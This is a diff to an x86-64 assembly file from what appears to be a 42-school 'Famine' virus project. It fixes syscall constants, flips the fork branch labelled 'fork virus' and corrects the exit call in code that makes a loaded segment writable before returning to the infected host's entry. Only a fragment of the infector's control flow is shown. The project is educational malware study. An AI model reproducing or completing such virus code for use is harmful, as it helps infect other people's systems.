@@ -6,16 +6,16 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/10 19:14:41 by agrumbac         ###   ########.fr        ;
+;    Updated: 2019/06/14 10:40:57 by spolowy          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
-%define SYSCALL_EXIT		0x0
-%define SYSCALL_WRITE		0x1
-%define SYSCALL_MPROTECT	0xa
-%define STDOUT			0x1
-%define PROT_RWX		0x7
-%define CALL_INSTR_SIZE		0x5
+%define SYSCALL_WRITE		0x01
+%define SYSCALL_EXIT		0x3c
+%define SYSCALL_MPROTECT	0x0a
+%define STDOUT			0x01
+%define PROT_RWX		0x07
+%define CALL_INSTR_SIZE		0x05
 %define SYSCALL_FORK		0x39
 section .text
 	global famine_entry
@@ -98,11 +98,11 @@ mark_below:
 	; test rax, rax
 	; jnz return_to_client
 ;------------------------------; fork virus
-	mov  rax, SYSCALL_FORK
+	mov rax, SYSCALL_FORK
 	syscall
 	test rax, rax
-	jnz return_to_client
-	
+	jz return_to_client
+
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
@@ -133,8 +133,9 @@ add r9, 0x2df0;TMp DEBUG
 	pop r14
 	pop rdx
 	mov rdi, 0
-	rax SYSCALL_EXIT
+	mov rax, SYSCALL_EXIT
 	syscall
+	ret
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
